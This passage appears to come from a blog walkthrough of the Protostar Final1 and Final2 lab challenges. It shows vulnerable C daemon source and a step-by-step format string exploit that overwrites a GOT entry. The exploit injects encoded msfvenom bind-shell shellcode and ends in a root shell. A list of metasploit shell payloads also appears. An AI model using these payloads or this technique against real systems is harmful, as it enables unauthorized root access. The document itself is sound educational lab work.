</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">trim</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">q</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">q</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="sc">&#39;\r&#39;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span> <span class="o">*</span><span class="n">q</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="n">q</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="sc">&#39;\n&#39;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span> <span class="o">*</span><span class="n">q</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">parser</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[final1] $ &quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">while</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">stdin</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">trim</span><span class="p">(</span><span class="n">line</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;username &quot;</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">strcpy</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">line</span><span class="o">+</span><span class="mi">9</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;login &quot;</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">if</span><span class="p">(</span><span class="n">username</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>              <span class="n">printf</span><span class="p">(</span><span class="s">&quot;invalid protocol</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>          <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>              <span class="n">logit</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">6</span><span class="p">);</span>
</span><span class='line'>              <span class="n">printf</span><span class="p">(</span><span class="s">&quot;login failed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>          <span class="p">}</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[final1] $ &quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">getipport</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">l</span><span class="p">;</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">sin</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">l</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">getpeername</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">l</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;you don&#39;t exist&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">sprintf</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span> <span class="s">&quot;%s:%d&quot;</span><span class="p">,</span> <span class="n">inet_ntoa</span><span class="p">(</span><span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">),</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span><span class="p">));</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Run the process as a daemon */</span>
</span><span class='line'>  <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Wait for socket activity and return */</span>
</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span>
</span><span class='line'>  <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">getipport</span><span class="p">();</span>
</span><span class='line'>  <span class="n">parser</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>We don&rsquo;t use spaces to find our format string to have more spaces left for
exploit. Also, both <code>username</code> and <code>login</code> parameters are vulnerable, we use
<code>username</code> to store shellcode and <code>login</code> for overwriting <code>GOT entry</code> for
<code>puts()</code>. The line with timestamp is the entry from <code>/var/log/syslog</code> file.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/tmp$ ruby -e 'print "username " + "A" * 109 + "BBBBCCCC"  + "\nlogin " + "%p" * 70 + "\n"'  | nc 0 2994
</span><span class='line'>[final1] $ [final1] $ [final1] $ login failed
</span><span class='line'>Jun 26 17:24:42 (none) final1: Login from 127.0.0.1:54427 as [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC] with password [0x8049ee40x804a2a00x804a2200xbffff7060xb7fd7ff40xbffff5580x69676f4c0x7266206e0x31206d6f0x302e37320x312e302e0x3434353a0x612037320x415b20730x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x424242420x434343430x6977205d0x702068740x777373610x2064726f0x2570255b0x257025700x257025700x257025700x257025700x257025700x257025700x257025700x257025700x257025700x257025700x257025700x25702570]
</span><span class='line'>
</span><span class='line'>user@protostar:/tmp$ ruby -e 'print "username " + "A" * 109 + "BBBBCCCC"  + "\nlogin " + "%p" * 43 + "\n"'  | nc 0 2994
</span><span class='line'>[final1] $ [final1] $ [final1] $ login failed
</span><span class='line'>Jun 26 17:26:22 (none) final1: Login from 127.0.0.1:54434 as [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC] with password [0x8049ee40x804a2a00x804a2200xbffff7060xb7fd7ff40xbffff5580x69676f4c0x7266206e0x31206d6f0x302e37320x312e302e0x3434353a0x612034330x415b20730x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x424242420x43434343]
</span><span class='line'>
</span><span class='line'>user@protostar:/tmp$ ruby -e 'print "username " + "A" * 109 + "BBBBCCCC"  + "\nlogin " + "%42\$p%43\$p" + "\n"'  | nc 0 2994
</span><span class='line'>[final1] $ [final1] $ [final1] $ login failed
</span><span class='line'>Jun 26 17:27:21 (none) final1: Login from 127.0.0.1:54435 as [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC] with password [0x424242420x43434343]</span></code></pre></td></tr></table></div></figure>


<p>We have 109 bytes for shellcode, not much but it should be sufficient.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@protostar:/tmp# objdump -t /opt/protostar/bin/final1  | grep username
</span><span class='line'>0804a220 g     O .bss 00000080              username
</span><span class='line'>
</span><span class='line'>user@protostar:/tmp$ objdump -TR /opt/protostar/bin/final1 | grep puts
</span><span class='line'>00000000      DF *UND*    00000000  GLIBC_2.0   puts
</span><span class='line'>0804a194 R_386_JUMP_SLOT   puts</span></code></pre></td></tr></table></div></figure>


<p>In order to pass this challenge, we need to store the address <code>0x0804a220</code> to
<code>0x0804a194</code>. Our <code>formatter.rb</code> is the same script as in the <code>protostar format</code>
challenges.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/tmp$ ruby1.9.1 ./formatter.rb 42:0x0804a194:0x0804a220
</span><span class='line'>ruby -e 'print [0x0804a196].pack("V") + [0x0804a194].pack("V") + "%42\$2044x%42\$hn%43\$39452x%43\$hn"'</span></code></pre></td></tr></table></div></figure>


<p>Exploitation process:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># window1:
</span><span class='line'>root@protostar:/tmp# gdb -q -ex 'set detach-on-fork off' -ex 'set follow-fork-mode child' -ex 'set disassembly-flavor intel' -ex 'run' /opt/protostar/bin/final1
</span><span class='line'>Reading symbols from /opt/protostar/bin/final1...done.
</span><span class='line'>Starting program: /opt/protostar/bin/final1 
</span><span class='line'>[New process 29349]
</span><span class='line'>[New process 29352]
</span><span class='line'>
</span><span class='line'># window2:
</span><span class='line'>user@protostar:/tmp$ ruby -e 'print "username " + "A" * 109 + [0x0804a196].pack("V") + [0x0804a194].pack("V")  + "\nlogin " + "%42\$2044x%42\$hn%43\$39452x%43\$hn" + "\n"'  | nc 0 2994
</span><span class='line'>[final1] $ [final1] $ [final1] $ ^C
</span><span class='line'>
</span><span class='line'># window1:
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>[Switching to process 29352]
</span><span class='line'>0x08a1a2bd in ?? ()
</span><span class='line'>
</span><span class='line'>(gdb) x /x 0x0804a194
</span><span class='line'>0x804a194 &lt;_GLOBAL_OFFSET_TABLE_+168>: 0x08a1a2bd</span></code></pre></td></tr></table></div></figure>


<p>So, we have <code>0x08a1a2bd</code> instead of <code>0x0804a220</code>, let&rsquo;s see the difference:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0x08a1-0x0804 = 157
</span><span class='line'>0xa2bd-0xa220 = 157</span></code></pre></td></tr></table></div></figure>


<p>Substracting <code>157</code> from <code>2044</code>, we got <code>1887</code> and that is the correct value, which we will use. Another try:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># window1:
</span><span class='line'>root@protostar:/tmp# gdb -q -ex 'set detach-on-fork off' -ex 'set follow-fork-mode child' -ex 'set disassembly-flavor intel' -ex 'run' /opt/protostar/bin/final1
</span><span class='line'>Reading symbols from /opt/protostar/bin/final1...done.
</span><span class='line'>Starting program: /opt/protostar/bin/final1 
</span><span class='line'>[New process 29370]
</span><span class='line'>[New process 29373]
</span><span class='line'>
</span><span class='line'># window2:
</span><span class='line'>user@protostar:/tmp$ ruby -e 'print "username " + "A" * 109 + [0x0804a196].pack("V") + [0x0804a194].pack("V")  + "\nlogin " + "%42\$1887x%42\$hn%43\$39452x%43\$hn" + "\n"'  | nc 0 2994
</span><span class='line'>[final1] $ [final1] $ [final1] $ ^C
</span><span class='line'>
</span><span class='line'># window1:
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>[Switching to process 29373]
</span><span class='line'>0x0804a28e in username ()
</span><span class='line'>(gdb) x /x 0x0804a194
</span><span class='line'>0x804a194 &lt;_GLOBAL_OFFSET_TABLE_+168>: 0x0804a220</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s correct, now we need to generate payload not longer than 109 bytes:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# /usr/share/metasploit-framework/tools/payload_lengths.rb | awk ' $2&lt;=100' | grep 'linux/x86'
</span><span class='line'>    linux/x86/adduser                                   97
</span><span class='line'>    linux/x86/chmod                                     36
</span><span class='line'>    linux/x86/exec                                      36
</span><span class='line'>    linux/x86/meterpreter/bind_ipv6_tcp                 85
</span><span class='line'>    linux/x86/meterpreter/bind_nonx_tcp                 63
</span><span class='line'>    linux/x86/meterpreter/find_tag                      37
</span><span class='line'>    linux/x86/meterpreter/reverse_ipv6_tcp              77
</span><span class='line'>    linux/x86/meterpreter/reverse_nonx_tcp              50
</span><span class='line'>    linux/x86/read_file                                 62
</span><span class='line'>    linux/x86/shell/bind_ipv6_tcp                       85
</span><span class='line'>    linux/x86/shell/bind_nonx_tcp                       63
</span><span class='line'>    linux/x86/shell/find_tag                            37
</span><span class='line'>    linux/x86/shell/reverse_ipv6_tcp                    77
</span><span class='line'>    linux/x86/shell/reverse_nonx_tcp                    50
</span><span class='line'>    linux/x86/shell_bind_ipv6_tcp                       90
</span><span class='line'>    linux/x86/shell_bind_tcp                            78
</span><span class='line'>    linux/x86/shell_bind_tcp_random_port                57
</span><span class='line'>    linux/x86/shell_find_port                           62
</span><span class='line'>    linux/x86/shell_find_tag                            69
</span><span class='line'>    linux/x86/shell_reverse_tcp                         68</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/shell_bind_tcp LPORT=2450 -b '\x0a\x0d\x00' -f sh
</span><span class='line'>No platform was selected, choosing Msf::Module::Platform::Linux from the payload
</span><span class='line'>No Arch selected, selecting Arch: x86 from the payload
</span><span class='line'>Found 22 compatible encoders
</span><span class='line'>Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
</span><span class='line'>x86/shikata_ga_nai succeeded with size 105 (iteration=0)
</span><span class='line'>Payload size: 105 bytes
</span><span class='line'>export buf=\
</span><span class='line'>$'\xda\xd9\xbd\xfe\xa6\x57\x8e\xd9\x74\x24\xf4\x5a\x31\xc9'\
</span><span class='line'>$'\xb1\x14\x83\xc2\x04\x31\x6a\x15\x03\x6a\x15\x1c\x53\x66'\
</span><span class='line'>$'\x55\x17\x7f\xda\x2a\x84\xea\xdf\x25\xcb\x5b\xb9\xf8\x8b'\
</span><span class='line'>$'\xc7\x18\x51\xe3\xf5\xa4\x5c\x61\x93\xb4\x0f\xd5\xed\x54'\
</span><span class='line'>$'\xc5\xb3\xb5\x5b\x9a\xb2\x07\x60\x28\xc0\x37\x0e\x83\x48'\
</span><span class='line'>$'\x74\x7f\x7d\x85\xfb\xec\xdb\x7f\xc3\x4a\x11\xff\x72\x12'\
</span><span class='line'>$'\x51\x97\xab\xcb\xd2\x0f\xdc\x3c\x77\xa6\x72\xca\x94\x68'\
</span><span class='line'>$'\xd8\x45\xbb\x38\xd5\x98\xbc'</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/tmp$ export buf=\
</span><span class='line'>> $'\xda\xd9\xbd\xfe\xa6\x57\x8e\xd9\x74\x24\xf4\x5a\x31\xc9'\
</span><span class='line'>> $'\xb1\x14\x83\xc2\x04\x31\x6a\x15\x03\x6a\x15\x1c\x53\x66'\
</span><span class='line'>> $'\x55\x17\x7f\xda\x2a\x84\xea\xdf\x25\xcb\x5b\xb9\xf8\x8b'\
</span><span class='line'>> $'\xc7\x18\x51\xe3\xf5\xa4\x5c\x61\x93\xb4\x0f\xd5\xed\x54'\
</span><span class='line'>> $'\xc5\xb3\xb5\x5b\x9a\xb2\x07\x60\x28\xc0\x37\x0e\x83\x48'\
</span><span class='line'>> $'\x74\x7f\x7d\x85\xfb\xec\xdb\x7f\xc3\x4a\x11\xff\x72\x12'\
</span><span class='line'>> $'\x51\x97\xab\xcb\xd2\x0f\xdc\x3c\x77\xa6\x72\xca\x94\x68'\
</span><span class='line'>> $'\xd8\x45\xbb\x38\xd5\x98\xbc'
</span><span class='line'>
</span><span class='line'>user@protostar:/tmp$ ruby -e 'print "username " + ENV["buf"] + "A" * (109-105) + [0x0804a196].pack("V") + [0x0804a194].pack("V")  + "\nlogin " + "%42\$1887x%42\$hn%43\$39452x%43\$hn" + "\n"'  | nc 0 2994
</span><span class='line'>[final1] $ [final1] $ [final1] $ ^C
</span><span class='line'>user@protostar:/tmp$ nc 0 2450
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)</span></code></pre></td></tr></table></div></figure>


<h2>Protostar Final2</h2>

<figure class='code'><figcaption><span>final2.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &quot;../common/common.c&quot;</span>
</span><span class='line'><span class="cp">#include &quot;../common/malloc.c&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define NAME &quot;final2&quot;</span>
</span><span class='line'><span class="cp">#define UID 0</span>
</span><span class='line'><span class="cp">#define GID 0</span>
</span><span class='line'><span class="cp">#define PORT 2993</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define REQSZ 128</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">check_path</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">start</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">l</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/*</span>
</span><span class='line'><span class="cm">  * Work out old software bug</span>
</span><span class='line'><span class="cm">  */</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">p</span> <span class="o">=</span> <span class="n">rindex</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">&#39;/&#39;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">l</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">start</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&quot;ROOT&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">start</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">while</span><span class="p">(</span><span class="o">*</span><span class="n">start</span> <span class="o">!=</span> <span class="sc">&#39;/&#39;</span><span class="p">)</span> <span class="n">start</span><span class="o">--</span><span class="p">;</span>
</span><span class='line'>          <span class="n">memmove</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">l</span><span class="p">);</span>
</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;moving from %p to %p (exploit: %s / %d)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">start</span> <span class="o">&lt;</span> <span class="n">buf</span> <span class="o">?</span>  <span class="s">&quot;yes&quot;</span> <span class="o">:</span> <span class="s">&quot;no&quot;</span><span class="p">,</span> <span class="n">start</span> <span class="o">-</span> <span class="n">buf</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">get_requests</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">destroylist</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">dll</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">dll</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">dll</span> <span class="o">&gt;=</span> <span class="mi">255</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">buf</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="n">REQSZ</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">REQSZ</span><span class="p">)</span> <span class="o">!=</span> <span class="n">REQSZ</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&quot;FSRD&quot;</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">check_path</span><span class="p">(</span><span class="n">buf</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">dll</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
